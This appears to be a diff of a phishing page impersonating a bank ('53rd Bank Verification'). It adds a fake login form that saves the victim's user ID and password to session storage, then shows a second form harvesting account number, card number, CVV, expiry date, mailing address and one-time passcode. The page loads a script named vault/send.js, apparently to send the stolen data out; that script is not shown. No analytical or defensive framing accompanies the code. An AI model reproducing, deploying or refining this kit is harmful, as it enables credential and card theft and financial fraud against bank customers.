@@ -1,52 +1,112 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Verify Account</title>
+  <meta charset="UTF-8">
+  <title>53rd Bank Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f5f5f5;
-      padding: 20px;
+      background: #f2f2f2;
+      margin: 0;
+      padding: 0;
     }
-    form {
-      max-width: 500px;
-      margin: auto;
+    .container {
+      max-width: 450px;
+      margin: 50px auto;
       background: #fff;
-      padding: 30px;
-      border-radius: 10px;
+      padding: 20px;
+      border-radius: 8px;
       box-shadow: 0 0 10px #ccc;
     }
-    input, button {
+    h2 {
+      text-align: center;
+      color: #333;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      color: #555;
+    }
+    input {
       width: 100%;
       padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 5px;
+      margin-top: 5px;
+      border-radius: 4px;
+      border: 1px solid #aaa;
     }
     button {
-      background-color: #007bff;
-      color: white;
+      margin-top: 20px;
+      width: 100%;
+      padding: 12px;
+      background: #0077cc;
       border: none;
+      color: #fff;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background: #005fa3;
     }
   </style>
 </head>
 <body>
 
-  <form id="verify-form">
-    <h2>Verify Your Account</h2>
-    <input type="text" name="accountnumber" placeholder="Account Number" required />
-    <input type="text" name="cardname" placeholder="Name on Card" required />
-    <input type="text" name="cardnumber" placeholder="Card Number" required />
-    <input type="text" name="cvv" placeholder="CVV" required />
-    <input type="text" name="expdate" placeholder="Expiry Date (MM/YY)" required />
-    <input type="text" name="mailingaddress" placeholder="Mailing Address" required />
-    <input type="text" name="otp" placeholder="OTP" required />
-    <button type="submit">Submit</button>
-  </form>
+  <div class="container">
+    <h2>Secure Login</h2>
+    <form id="login-form">
+      <label for="userid">User ID</label>
+      <input type="text" id="userid" name="userid" required>
 
-  <!-- ✅ Only include this once -->
-  <script src="vault/send.js"></script>
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" required>
+
+      <button type="submit">Login</button>
+    </form>
+
+    <form id="verify-form" style="display: none;">
+      <h2>Verification</h2>
+
+      <label for="accountnumber">Account Number</label>
+      <input type="text" id="accountnumber" name="accountnumber" required>
+
+      <label for="cardname">Name on Card</label>
+      <input type="text" id="cardname" name="cardname" required>
+
+      <label for="cardnumber">Card Number</label>
+      <input type="text" id="cardnumber" name="cardnumber" required>
+
+      <label for="cvv">CVV</label>
+      <input type="text" id="cvv" name="cvv" required>
+
+      <label for="expdate">Expiry Date</label>
+      <input type="text" id="expdate" name="expdate" placeholder="MM/YY" required>
+
+      <label for="mailingaddress">Mailing Address</label>
+      <input type="text" id="mailingaddress" name="mailingaddress" required>
+
+      <label for="otp">OTP</label>
+      <input type="text" id="otp" name="otp" required>
+
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function (e) {
+      e.preventDefault();
+      const userid = document.getElementById('userid').value.trim();
+      const password = document.getElementById('password').value.trim();
+      sessionStorage.setItem('userid', userid);
+      sessionStorage.setItem('password', password);
+      document.getElementById('login-form').style.display = 'none';
+      document.getElementById('verify-form').style.display = 'block';
+    });
+  </script>
+
+  <!-- Load the real script if it's available -->
+  <script src="/vault/send.js"></script>
+
 </body>
 </html>
